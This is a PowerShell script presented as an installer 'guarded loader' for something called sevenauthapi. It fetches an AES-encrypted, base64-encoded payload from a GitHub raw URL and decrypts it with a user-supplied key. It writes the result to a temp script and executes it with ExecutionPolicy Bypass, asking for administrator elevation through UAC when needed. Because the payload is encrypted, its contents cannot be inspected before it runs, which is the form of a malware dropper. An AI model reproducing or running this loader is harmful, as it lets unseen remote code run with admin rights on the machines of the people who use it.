# sevenauthapi installer â€” guarded loader
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$key = $env:SEVEN_KEY
if (-not $key) { $key = Read-Host 'Key' }
if (-not $key) { throw 'bla key' }

$url = 'https://raw.githubusercontent.com/MarcoCOdev1/dd/main/p.bin?t=' + [DateTime]::UtcNow.Ticks
$res = Invoke-WebRequest -UseBasicParsing $url
$b64 = if ($res.Content -is [byte[]]) { [Text.Encoding]::ASCII.GetString($res.Content) } else { $res.Content }
try { $raw = [Convert]::FromBase64String($b64) } catch { throw 'payload kharban (cache?) â€” 3awd' }

$sha = [Security.Cryptography.SHA256]::Create()
$a   = [Security.Cryptography.Aes]::Create()
$a.Mode = 'CBC'; $a.Padding = 'PKCS7'
$a.Key = $sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($key))
$a.IV  = $raw[0..15]
try {
    $code = [Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($raw, 16, $raw.Length - 16))
} catch { throw 'key ghalta wala payload kharban' }

$tmp = Join-Path $env:TEMP ('seven-install-' + [Guid]::NewGuid().ToString('N').Substring(0,8) + '.ps1')
Set-Content -Path $tmp -Value $code -Encoding UTF8

$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
         [Security.Principal.WindowsBuiltInRole]::Administrator)
if ($admin) { & powershell -NoProfile -ExecutionPolicy Bypass -File $tmp }
else {
    Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$tmp`"")
    Write-Host 'UAC tlob â€” 9bel w kemmel f l window jdida.' -ForegroundColor Yellow
}
